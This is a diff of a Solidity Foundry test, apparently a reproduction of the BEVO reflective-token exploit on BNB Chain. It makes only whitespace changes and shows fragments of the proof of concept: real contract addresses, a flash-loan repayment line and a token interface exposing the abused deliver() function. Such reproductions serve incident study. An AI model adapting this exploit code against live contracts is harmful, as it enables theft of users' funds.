@@ -16,6 +16,7 @@ import "./../interface.sol";
 // https://twitter.com/QuillAudits/status/1620377951836708865
 
 contract BEVOExploit is Test {
+
     IERC20 private constant wbnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     reflectiveERC20 private constant bevo = reflectiveERC20(0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa);
     IUniswapV2Pair private constant wbnb_usdc = IUniswapV2Pair(0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b);
@@ -60,14 +61,17 @@ contract BEVOExploit is Test {
 
         wbnb.transfer(address(wbnb_usdc), 193 ether);
     }
+
 }
 /* -------------------- Interface -------------------- */
 
 interface reflectiveERC20 {
+
     function transfer(address to, uint256 amount) external returns (bool);
     function approve(address spender, uint256 amount) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 
     function deliver(uint256 tAmount) external;
+
 }
